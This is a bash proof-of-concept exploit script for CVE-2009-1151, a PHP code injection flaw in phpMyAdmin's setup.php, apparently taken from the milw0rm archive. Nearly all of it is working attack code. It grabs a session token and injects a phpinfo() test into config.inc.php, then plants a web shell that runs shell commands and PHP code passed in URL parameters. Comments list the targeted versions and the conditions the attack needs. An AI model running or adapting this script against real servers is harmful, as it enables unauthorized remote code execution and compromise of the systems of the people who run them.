#!/bin/bash

# CVE-2009-1151: phpMyAdmin '/scripts/setup.php' PHP Code Injection RCE PoC v0.11
# by pagvac (gnucitizen.org), 4th June 2009.
# special thanks to Greg Ose (labs.neohapsis.com) for discovering such a cool vuln, 
# and to str0ke (milw0rm.com) for testing this PoC script and providing feedback!

# PoC script successfully tested on the following targets:
# phpMyAdmin 2.11.4, 2.11.9.3, 2.11.9.4, 3.0.0 and 3.0.1.1
# Linux 2.6.24-24-generic i686 GNU/Linux (Ubuntu 8.04.2)

# attack requirements:
# 1) vulnerable version (obviously!): 2.11.x before 2.11.9.5
# and 3.x before 3.1.3.1 according to PMASA-2009-3
# 2) it *seems* this vuln can only be exploited against environments
# where the administrator has chosen to install phpMyAdmin following
# the *wizard* method, rather than manual method: http://snipurl.com/jhjxx
# 3) administrator must have NOT deleted the '/config/' directory
# within the '/phpMyAdmin/' directory. this is because this directory is
# where '/scripts/setup.php' tries to create 'config.inc.php' which is where
# our evil PHP code is injected 8)

# more info on:
# http://www.phpmyadmin.net/home_page/security/PMASA-2009-3.php
# http://labs.neohapsis.com/2009/04/06/about-cve-2009-1151/

if [[ $# -ne 1 ]]
then
	echo "usage: ./$(basename $0) <phpMyAdmin_base_URL>"
	echo "i.e.: ./$(basename $0) http://target.tld/phpMyAdmin/"
	exit
fi

if ! which curl >/dev/null
then
	echo "sorry but you need curl for this script to work!"
       	echo "on Debian/Ubuntu: sudo apt-get install curl"
       	exit
fi


function exploit {

postdata="token=$1&action=save&configuration="\
"a:1:{s:7:%22Servers%22%3ba:1:{i:0%3ba:6:{s:23:%22host%27]="\
"%27%27%3b%20phpinfo%28%29%3b//%22%3bs:9:%22localhost%22%3bs:9:"\
"%22extension%22%3bs:6:%22mysqli%22%3bs:12:%22connect_type%22%3bs:3:"\
"%22tcp%22%3bs:8:%22compress%22%3bb:0%3bs:9:%22auth_type%22%3bs:6:"\
"%22config%22%3bs:4:%22user%22%3bs:4:%22root%22%3b}}}&eoltype=unix"

postdata2="token=$1&action=save&configuration=a:1:"\
"{s:7:%22Servers%22%3ba:1:{i:0%3ba:6:{s:136:%22host%27%5d="\
"%27%27%3b%20if(\$_GET%5b%27c%27%5d){echo%20%27%3cpre%3e%27%3b"\
"system(\$_GET%5b%27c%27%5d)%3becho%20%27%3c/pre%3e%27%3b}"\
"if(\$_GET%5b%27p%27%5d){echo%20%27%3cpre%3e%27%3beval"\
"(\$_GET%5b%27p%27%5d)%3becho%20%27%3c/pre%3e%27%3b}%3b//"\
"%22%3bs:9:%22localhost%22%3bs:9:%22extension%22%3bs:6:%22"\
"mysqli%22%3bs:12:%22connect_type%22%3bs:3:%22tcp%22%3bs:8:"\
"%22compress%22%3bb:0%3bs:9:%22auth_type%22%3bs:6:%22config"\
"%22%3bs:4:%22user%22%3bs:4:%22root%22%3b}}}&eoltype=unix"

	flag="/tmp/$(basename $0).$RANDOM.phpinfo.flag.html"
	
	echo "[+] attempting to inject phpinfo() ..."
	curl -ks -b $2 -d "$postdata" --url "$3/scripts/setup.php" >/dev/null

	if curl -ks --url "$3/config/config.inc.php" | grep "phpinfo()" >/dev/null
	then
		curl -ks --url "$3/config/config.inc.php" >$flag	
		echo "[+] success! phpinfo() injected successfully! output saved on $flag"
		curl -ks -b $2 -d $postdata2 --url "$3/scripts/setup.php" >/dev/null
		echo "[+] you *should* now be able to remotely run shell commands and PHP code using your browser. i.e.:"
		echo "    $3/config/config.inc.php?c=ls+-l+/"
		echo "    $3/config/config.inc.php?p=phpinfo();"
		echo "    please send any feedback/improvements for this script to"\
		"unknown.pentester<AT_sign__here>gmail.com"
	else
		echo "[+] no luck injecting to $3/config/config.inc.php :("
		exit
	fi
}
# end of exploit function

cookiejar="/tmp/$(basename $0).$RANDOM.txt"
token=`curl -ks -c $cookiejar --url "$1/scripts/setup.php" | grep \"token\" | head -n 1 | cut -d \" -f 12`
echo "[+] checking if phpMyAdmin exists on URL provided ..."

#if grep phpMyAdmin $cookiejar 2>/dev/null > /dev/null
if grep phpMyAdmin $cookiejar &>/dev/null
then
	length=`echo -n $token | wc -c`

	# valid form token obtained?
	if [[ $length -eq 32 ]]
	then
		echo "[+] phpMyAdmin cookie and form token received successfully. Good!"
		# attempt exploit!
		exploit $token $cookiejar $1
	else
		echo "[+] could not grab form token. you might want to try exploiting the vuln manually :("
		exit
	fi
else
	echo "[+] phpMyAdmin NOT found! phpMyAdmin base URL incorrectly typed? wrong case-sensitivity?"
	exit
fi

# milw0rm.com [2009-06-09]
